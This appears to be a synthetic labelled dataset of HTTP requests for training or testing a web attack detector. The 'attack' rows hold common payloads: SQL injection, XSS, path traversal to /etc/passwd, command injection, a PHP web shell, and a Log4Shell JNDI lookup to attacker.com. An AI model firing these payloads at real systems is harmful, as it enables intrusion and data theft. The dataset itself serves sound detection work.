id,timestamp,method,path,http_headers,body,label
1bd9503a-00ce-46f6-aa50-a65284c27611,2026-02-24 09:46:51,POST,/contact,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
3f8fde6b-9ad8-4750-b346-572847e321d9,2026-02-24 08:44:34,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
de69e5b4-1ef9-4e4f-8d5c-5ca9ce0c2236,2026-02-24 11:48:54,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
f3048b23-a475-4756-bb2e-21a49b81b25d,2026-02-24 23:42:08,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
688a149d-b573-4b68-8be7-9f43b5fafdd6,2026-02-24 17:09:24,POST,/products?id=123,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
6d017995-cec2-4c5b-8da3-0114d204a45f,2026-02-24 22:33:38,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
b09d1eba-ee75-4944-b560-7f3cf8734097,2026-02-24 23:25:12,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
882cf703-51e2-4fa1-9f34-465cd421c7c9,2026-02-24 16:36:43,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
3acd95d6-702b-4084-ad95-fad3492f417c,2026-02-24 13:39:15,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
28f3b985-b153-495c-893c-3ec6ce183ca2,2026-02-25 00:46:30,POST,/search?q=shoes,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
2aa55fe9-c71f-45b7-9fa7-ffe119cedcc8,2026-02-24 06:52:44,GET,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
ac6b777b-dc42-4bd4-89ba-03289bf3c8aa,2026-02-24 09:08:06,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
5d939060-01ed-446c-ac35-5a1aca30151f,2026-02-25 09:29:38,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
0e46b99e-435a-4a0f-9a60-d16bc5a27ac7,2026-02-24 12:21:59,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
d91be5e4-fd5a-432b-b1a3-fb4dfdd1f34c,2026-02-25 04:03:54,GET,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
7cfdd4bb-f1a8-4ce3-8d55-b2c6f4275bdd,2026-02-24 06:54:48,GET,/checkout,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
14638ab3-5bcc-4dda-8730-2b850663051b,2026-02-24 11:41:36,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
34391e89-b9fd-4deb-aa43-7e16b5ca88fc,2026-02-24 14:58:22,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
e49edb6e-6ebb-421e-ae0c-9538957336f0,2026-02-24 09:43:33,GET,/home,User-Agent: Chrome/120.0.0.0,,normal
90c98bfc-2b8e-4dbc-9bc3-587b564b754e,2026-02-24 14:09:19,GET,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
db7e689a-3e27-43e9-9219-934e46faa50e,2026-02-24 08:14:49,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
62ce5a78-c2dc-465c-9246-b7b2e9757943,2026-02-24 22:18:08,POST,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
9df8c382-449b-47fc-8b03-8835455d81e8,2026-02-25 06:31:50,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
1a6a7b22-cb59-4055-92a8-23ca3e2b80dc,2026-02-24 12:25:29,GET,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
c44fc5c0-8561-4fe1-8077-6a7bb569f9d5,2026-02-24 12:07:44,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
fdb642ef-4294-40b1-8acf-38a1a92e4eb4,2026-02-25 07:45:11,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
20c87eaa-26b3-4a59-90fe-0ebe2e24df6c,2026-02-25 07:16:48,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: curl/7.68.0,${jndi:ldap://attacker.com/a},attack
6d9d5e05-c49f-437f-aabc-ae2db9a97192,2026-02-24 21:31:52,GET,/contact,User-Agent: Safari/537.36,,normal
0ea14b0a-8462-4cc0-b3f0-ddbfca5666dd,2026-02-25 10:16:54,POST,/products,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
09d6a4ad-a282-4ebc-a33d-4af6d89b12b2,2026-02-24 14:31:32,GET,/contact,User-Agent: Chrome/120.0.0.0,,normal
be6cf4cc-1e1f-49d0-9bf2-70f2b05c2fd8,2026-02-24 20:30:05,POST,/products,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
1afe1d2c-bae5-470b-b3ad-866b807eb688,2026-02-25 08:17:16,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
c8030d2f-907c-4675-ab57-c71ce93852cf,2026-02-25 08:44:06,POST,/cart,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
3caa7c38-87f2-47ef-9a7f-524b14ee5eb5,2026-02-24 14:09:46,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: curl/7.68.0,SELECT * FROM users WHERE id = 1 OR 1=1,attack
0113b84b-71cf-4670-ab33-f7df5aa8bf19,2026-02-24 09:35:06,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
1c87ab27-b5e4-4126-9e4e-07a1132dfe50,2026-02-25 00:10:20,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
396efcb1-8169-4600-a648-e2618cafb5ae,2026-02-25 08:34:56,GET,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
1e08b7d1-188d-4bcc-a26d-63d939e137c0,2026-02-24 12:22:46,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<img src=x onerror=alert(1)>,attack
3a3d3101-7419-4f1e-8c56-4db9038bda58,2026-02-24 12:34:51,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
bfdc4568-6603-4b7a-b3c4-f6fa04914896,2026-02-24 08:26:58,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
6087ca2f-4dbc-4217-8f74-b301cdd33a26,2026-02-24 13:01:03,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
541ffeff-6114-4cfa-b9b6-dabb55a3a3d1,2026-02-24 14:56:35,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
5c9add62-5bba-4cc8-af11-7e034a07cda4,2026-02-25 09:36:41,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
2e855f30-57ed-4459-be8a-743e73e23f9e,2026-02-24 11:47:15,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
61e92077-fead-486a-a803-d1940267ca7b,2026-02-24 08:47:31,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
62f384e0-6826-45ce-92d3-433d0bae2711,2026-02-24 17:34:54,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
59c3684c-777b-47af-9501-4809c63bcc9e,2026-02-24 07:46:50,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
9c118696-c87a-44ce-a6a0-cb50e7a97283,2026-02-24 15:00:53,POST,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
2bf0b51c-55c2-424f-8076-dbf6c770a1f4,2026-02-25 10:02:53,POST,/search?q=shoes,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
fb4c773d-395a-4a7b-b75b-e4d4723fd3aa,2026-02-24 06:44:18,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
a706e0cf-3f52-4550-a5d1-7bf71d726d59,2026-02-24 10:16:07,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
e6fa2de7-cc09-46e5-baea-9cadfe99510d,2026-02-25 01:16:10,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
45d8aa75-a9cb-4212-974e-f33ffb073656,2026-02-24 23:51:05,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: sqlmap/1.6,|| ping -c 4 127.0.0.1 ||,attack
bb4486c7-6bac-45a5-9ab5-3cad1824ea70,2026-02-24 23:36:51,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
e57c812e-d80f-45f7-b32b-762331f5e95f,2026-02-24 06:40:30,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
42a1736e-5856-4934-96e6-4ea6dd2e573c,2026-02-24 20:49:41,GET,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
d8ed0ae2-dc67-42e0-90fe-3bd58894c92d,2026-02-24 17:02:32,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
f5025e28-d7c5-4bfa-8b20-5545893b4d24,2026-02-25 08:44:46,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
da326834-33c7-4ca5-89ef-ab15eee0cae0,2026-02-25 10:22:29,POST,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
9c0075ef-c06b-4b17-9b60-0e82a4529095,2026-02-24 22:17:36,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
2bf5941c-bff6-4f0c-ab18-2d9e6243c2a7,2026-02-24 07:20:08,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
f4372223-386c-408b-9c9e-70505fb7a595,2026-02-25 04:17:37,GET,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
73a9ea29-5b30-4798-a89e-8540ee4f181c,2026-02-24 20:12:48,GET,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
968a7e13-b45b-4278-88d3-a38c63252b56,2026-02-24 16:52:13,GET,/api/v1/users,User-Agent: Safari/537.36,,normal
30945fcf-4935-41ac-8869-8d1f233499f2,2026-02-24 12:18:39,POST,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
38d2a38e-7125-4bc3-8a79-86d1ca1eb104,2026-02-24 09:46:12,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
42049164-d9aa-45ae-bf07-876748a01ee3,2026-02-25 08:30:23,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
e3af8ded-54d1-4215-8c63-5499db486fc6,2026-02-25 05:45:52,POST,/blog/article-1,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
72b891c1-4f88-4834-8c35-759b88d3b6a8,2026-02-24 23:35:03,POST,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
ac1e5493-5d55-4005-bef1-fd69a512cf58,2026-02-25 08:15:51,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
59be0702-6295-40ed-987a-8a3d115bf6d7,2026-02-24 07:14:31,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
b7ff4564-282e-43b3-b2d3-800cd0f5fe95,2026-02-24 20:32:50,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
30a2394c-7b0c-4ba9-9d79-03c5147710e4,2026-02-24 17:33:17,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
7f79de15-d71f-4569-b937-df9fc6bd6506,2026-02-24 14:52:24,GET,/search?q=shoes,User-Agent: Chrome/120.0.0.0,,normal
5fff6235-ca4b-4139-a480-f29dc180924d,2026-02-25 02:52:39,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
e39fa5dc-2b67-4eb2-8add-bec32acb3b1b,2026-02-24 10:50:45,GET,/blog/article-1,User-Agent: Safari/537.36,,normal
2aeb4ebf-a724-4c7c-bd18-7d543c9fcfe1,2026-02-25 08:02:27,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
81afc13a-f4a7-477b-9042-57f41fee8508,2026-02-25 05:51:43,GET,/checkout,User-Agent: Safari/537.36,,normal
96cb4ecb-0bcf-4dc1-a16b-d7a36f41fce1,2026-02-24 07:52:07,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
068a2879-30e5-4184-9db8-500549d07f18,2026-02-24 17:51:07,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
a9fb0b1e-8ef0-4492-b5f4-030fd23756ae,2026-02-24 08:57:50,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: curl/7.68.0,SELECT * FROM users WHERE id = 1 OR 1=1,attack
71950c84-d209-4953-b3c7-c1aa96718ae0,2026-02-25 03:06:10,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<img src=x onerror=alert(1)>,attack
e62491dc-ea3e-472d-b09c-28193872be16,2026-02-24 21:48:51,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
8291ee19-aba7-47af-95f2-102b964f6cf9,2026-02-24 15:02:45,GET,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
b72379cc-9d9d-4655-ba2c-281b54ca071e,2026-02-24 07:43:14,POST,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
fda5f2c8-f558-4b35-b6bc-e24191c8763a,2026-02-24 21:19:28,POST,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
fdbd5a28-be97-4d81-a864-49d63262aeed,2026-02-24 16:58:04,POST,/checkout,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
1740d3ef-a98b-4357-9ffb-8b5a59014656,2026-02-25 07:18:59,GET,/search?q=shoes,User-Agent: Chrome/120.0.0.0,,normal
cf5d6ad5-e339-4ebc-827d-dad0fb87e6cb,2026-02-25 05:48:49,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
c2664f22-d345-4e1e-86aa-de047b61c24a,2026-02-24 15:36:46,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
8d085c7c-5f1c-401c-a2d2-cea469b71bde,2026-02-24 18:31:09,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: sqlmap/1.6,|| ping -c 4 127.0.0.1 ||,attack
369ad412-5fba-486a-8c3a-3664873af246,2026-02-24 14:46:21,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
414b2b3c-b797-42e8-bc2a-791dc5d23c97,2026-02-25 04:57:37,GET,/cart,User-Agent: Safari/537.36,,normal
0d5ddf7a-a6e3-4746-a3de-3c2bdb56a951,2026-02-24 11:08:56,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
ae1daa31-aec0-4efc-9491-4f74aba6ee8a,2026-02-25 03:19:40,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
b42fbd70-59c7-4048-8fe1-6ae9a9589c80,2026-02-24 21:06:01,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
8f310eea-543e-4ba0-b697-6a8961ab5093,2026-02-25 05:40:23,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: curl/7.68.0,${jndi:ldap://attacker.com/a},attack
054e3f28-7762-49ad-8d4c-1af87fe7dd40,2026-02-24 12:32:30,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
59669c3d-650e-4115-9032-4818389618d8,2026-02-25 00:52:48,POST,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
75772326-4b5a-4623-9d1f-a274c14cff61,2026-02-25 02:37:03,GET,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
67767621-33b3-41e8-85f5-4abe9323831b,2026-02-24 18:08:24,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
f2fa5730-b234-4583-8429-d751edc694b6,2026-02-24 15:48:19,POST,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
a737c949-9058-4ce5-ad52-d865e9ef2f18,2026-02-24 22:44:02,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
91baa111-af42-4efb-a721-9455f8e132de,2026-02-25 02:44:05,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
49aad557-5441-4636-a014-41838a29394b,2026-02-24 19:31:16,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
04300825-c3f2-4de2-b591-14703ec5f2df,2026-02-24 22:11:27,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
9fb7c378-7659-4564-a4ac-a61b7793d727,2026-02-24 21:09:02,GET,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
b54916d6-2081-467d-bfff-3d53d951241a,2026-02-24 14:14:28,GET,/search?q=shoes,User-Agent: Chrome/120.0.0.0,,normal
08ad597d-fa7e-4451-ba63-c67adcfeeff3,2026-02-24 08:16:10,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
2d86ecd0-215a-477c-9cfa-83a579bac01c,2026-02-24 10:51:13,GET,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
3d8c243d-c024-4183-9219-a8a8a0ee364d,2026-02-24 14:41:58,GET,/products,User-Agent: Safari/537.36,,normal
5f3c7f73-8b2e-4540-b2e9-633615a20c5e,2026-02-25 00:36:44,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
f6a2f9b9-6047-4a0e-834a-204b39bdf3fb,2026-02-24 22:40:25,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
3a7217a0-ae8b-4e82-83bb-5983ef08d987,2026-02-24 06:43:38,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
07f53919-7f36-405f-8509-a38b16d87e89,2026-02-25 05:06:52,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
53d39506-2cd3-472f-9827-0da0744b10fa,2026-02-24 17:55:57,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
2fb8f0e1-4f82-4dd1-b4dc-71ea2cc34310,2026-02-24 07:00:28,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
75900b6e-81c0-49b8-b5af-49122e4b180d,2026-02-25 10:13:43,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: curl/7.68.0,SELECT * FROM users WHERE id = 1 OR 1=1,attack
95522231-b2f7-4e6b-8820-6197c25c4166,2026-02-24 10:08:41,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
3e485a85-e709-4e1b-b533-ab74ac330335,2026-02-24 18:48:09,POST,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
04c88a1d-b356-427b-b9f8-89ede87438be,2026-02-24 21:32:04,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
72cf8eac-9fcc-4165-895f-0a3b97e18bad,2026-02-25 02:29:21,GET,/blog/article-1,User-Agent: Chrome/120.0.0.0,,normal
4148ca19-5fd3-4f27-a1d9-272175e40c4e,2026-02-24 11:19:08,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
250181c1-dd1d-4c39-af7b-66b72d22b9ee,2026-02-24 08:19:17,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
3f5f8b76-29c9-4cf2-bb29-2a9306122dfe,2026-02-25 08:52:12,GET,/api/v1/orders?status=completed,User-Agent: Chrome/120.0.0.0,,normal
3500dc1a-1de2-4f17-a247-20f7d615390a,2026-02-25 08:56:06,GET,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
10e7ed39-ba5a-408f-a886-516e1f100875,2026-02-24 10:31:11,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
c9b57235-d9d7-4cbf-8653-0829b39e7d46,2026-02-24 19:59:09,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
44344b56-3f26-44db-87c7-ec165d82ecad,2026-02-24 16:29:54,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
166312c6-e1d7-4b3d-ba30-7325576ab0f3,2026-02-24 23:04:26,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
f0e5209d-d179-43d4-b1a8-0f22aec2abbb,2026-02-25 00:37:11,GET,/api/v1/users,User-Agent: Safari/537.36,,normal
5b158eac-ef82-4031-879e-724ce81b441c,2026-02-24 13:58:03,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
4e52e26e-adf9-4ac9-99bc-78ea7499bc02,2026-02-24 09:09:12,POST,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
ee2c13e4-bc8c-463a-85ea-a5c614347464,2026-02-24 12:26:06,GET,/products,User-Agent: Safari/537.36,,normal
35e32c79-491d-47c4-9215-35f3ced0f8aa,2026-02-25 08:38:40,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
7cda29e4-a8d8-4e23-9088-ecdcd053762a,2026-02-24 09:33:48,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
05cac119-3222-4914-a9d0-d150af61f204,2026-02-25 00:42:03,GET,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
a40158c8-3132-4a3c-8de1-a7e3cca2aa0d,2026-02-25 04:12:18,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
fc9888b8-5a5b-4ae8-b4ce-93f817967b84,2026-02-24 14:31:22,POST,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
e0f6d9f2-12a6-4a04-b69d-49078224ed99,2026-02-24 08:10:40,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
